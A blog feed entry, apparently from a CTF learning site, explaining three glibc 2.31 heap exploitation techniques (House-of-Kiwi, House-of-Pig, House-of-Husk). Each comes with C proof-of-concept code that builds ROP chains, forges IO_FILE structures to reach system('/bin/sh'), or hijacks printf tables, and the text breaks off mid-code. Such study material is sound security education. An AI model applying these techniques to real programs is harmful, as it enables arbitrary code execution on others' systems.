{
    "version": "https://jsonfeed.org/version/1",
    "title": "-NIYAH- • All posts by \"学习\" category",
    "description": "Niyah",
    "home_page_url": "http://niyah.cn",
    "items": [
        {
            "id": "http://niyah.cn/CTF/%E9%80%82%E7%94%A8%E4%BA%8E%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84house/",
            "url": "http://niyah.cn/CTF/%E9%80%82%E7%94%A8%E4%BA%8E%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84house/",
            "title": "适用于高版本的三大house",
            "date_published": "2022-01-27T16:00:00.000Z",
            "content_html": "<p>libc2.31 版本可用</p>\n<a id=\"more\"></a>\n<h1 id=\"适用于高版本的三大house\"><a class=\"markdownIt-Anchor\" href=\"#适用于高版本的三大house\">#</a> 适用于高版本的三大 house</h1>\n<p>其中 House-of-Kiwi 需要进行两次任意地址申请，实现起来是比较困难的</p>\n<p>而 House-of-Pig 和 House-of-Husk 只需要写可控地址就行了，用 Large bin attack 就可以做到，但是 House-of-Husk 需要有 printf 和格式化字符串并且只能执行 gadget</p>\n<h2 id=\"house-of-kiwi\"><a class=\"markdownIt-Anchor\" href=\"#house-of-kiwi\">#</a> House-of-Kiwi</h2>\n<p>poc 参考：<a href=\"https://www.anquanke.com/post/id/235598\">House OF Kiwi - by Refrain</a></p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token comment\">// Ubuntu GLIBC 2.31-0ubuntu9.2</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;assert.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/prctl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/filter.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/seccomp.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">pop_rdi_ret libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000026b72</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">pop_rdx_r12 libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000011c371</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">pop_rsi_ret libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000027529</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">pop_rax_ret libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000004a550</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">syscall_ret libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000066229</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">ret pop_rdi_ret<span class=\"token operator\">+</span><span class=\"token number\">1</span> </span></span>\nsize_t ROP<span class=\"token punctuation\">[</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nsize_t libc_base<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">char</span> FLAG<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"./flag.txt\\x00\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">sandbox</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_NO_NEW_PRIVS<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_filter</span> sfi<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00000004</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xC000003E</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00000000</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x35</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40000000</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xFFFFFFFF</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x0000003B</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7FFF0000</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00000000</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_fprog</span> sfp <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> sfi<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_SECCOMP<span class=\"token punctuation\">,</span> SECCOMP_MODE_FILTER<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>sfp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">setROP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    uint32_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rax_ret<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdi_ret<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span>FLAG<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rsi_ret<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> syscall_ret<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdi_ret<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdx_r12<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rsi_ret<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>FLAG <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span>read<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdi_ret<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span>write<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">sandbox</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    libc_base  <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span>setvbuf<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x87e60</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LIBC:\\t%#lx\\n\"</span><span class=\"token punctuation\">,</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    size_t magic_gadget <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x580a0</span> <span class=\"token operator\">+</span> <span class=\"token number\">61</span><span class=\"token punctuation\">;</span>\n    size_t IO_helper <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x1ec8a0</span><span class=\"token punctuation\">;</span>\n    size_t SYNC <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x1ed500</span><span class=\"token punctuation\">;</span> \n    <span class=\"token function\">setROP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>IO_helper <span class=\"token operator\">+</span> <span class=\"token number\">0xA0</span><span class=\"token operator\">/</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> ROP<span class=\"token punctuation\">;</span> <span class=\"token comment\">//攻击点1</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>IO_helper <span class=\"token operator\">+</span> <span class=\"token number\">0xA8</span><span class=\"token operator\">/</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> ret<span class=\"token punctuation\">;</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>SYNC<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> magic_gadget<span class=\"token punctuation\">;</span> <span class=\"token comment\">//攻击点2</span>\n\n    size_t <span class=\"token operator\">*</span>top_size <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token operator\">*</span>top_size <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>top_size<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xFFE</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//攻击点3</span>\n    \n    <span class=\"token comment\">// getchar();</span>\n    <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 触发assert</span>\n    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<h2 id=\"house-of-pig\"><a class=\"markdownIt-Anchor\" href=\"#house-of-pig\">#</a> House-of-Pig</h2>\n<p>poc</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token comment\">// Ubuntu GLIBC 2.31-0ubuntu9.2</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">system libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x55410</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">_IO_list_all libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x1ec5a0</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">_IO_str_jumps libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x1ed560</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">__free_hook libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x1eeb28</span></span></span>\n\nsize_t data<span class=\"token punctuation\">[</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nsize_t fake_io<span class=\"token punctuation\">[</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\nsize_t libc_base<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">setFakeIo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    fake_io<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    fake_io<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffffffff</span><span class=\"token punctuation\">;</span>\n    fake_io<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> data<span class=\"token punctuation\">;</span>\n    fake_io<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> data <span class=\"token operator\">+</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">;</span>\n    fake_io<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _IO_str_jumps <span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">setData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    data<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x0068732f6e69622f</span><span class=\"token punctuation\">;</span>\n    data<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> system<span class=\"token punctuation\">;</span>\n    data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> system<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    libc_base  <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span>setvbuf<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x87e60</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>_IO_list_all<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> fake_io<span class=\"token punctuation\">;</span> <span class=\"token comment\">//攻击点1</span>\n\n    <span class=\"token function\">setData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setFakeIo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    size_t <span class=\"token operator\">*</span>heap_base <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x2a0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>heap_base <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x168</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">8</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> __free_hook <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//攻击点2（tcache管理块）</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>heap_base <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x38</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x2</span> <span class=\"token punctuation\">)</span><span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<h2 id=\"house-of-husk\"><a class=\"markdownIt-Anchor\" href=\"#house-of-husk\">#</a> House-of-Husk</h2>\n<p>poc</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token comment\">// Ubuntu GLIBC 2.31-0ubuntu9.2</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">ogg libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0xe6c7e</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">__printf_arginfo_table libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x1f1350</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">__printf_function_table libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x1f0ff8</span></span></span>\n\nsize_t fake_zone<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nsize_t libc_base<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    libc_base  <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span>setvbuf<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x87e60</span><span class=\"token punctuation\">;</span>\n    fake_zone<span class=\"token punctuation\">[</span><span class=\"token number\">0x73</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> ogg<span class=\"token 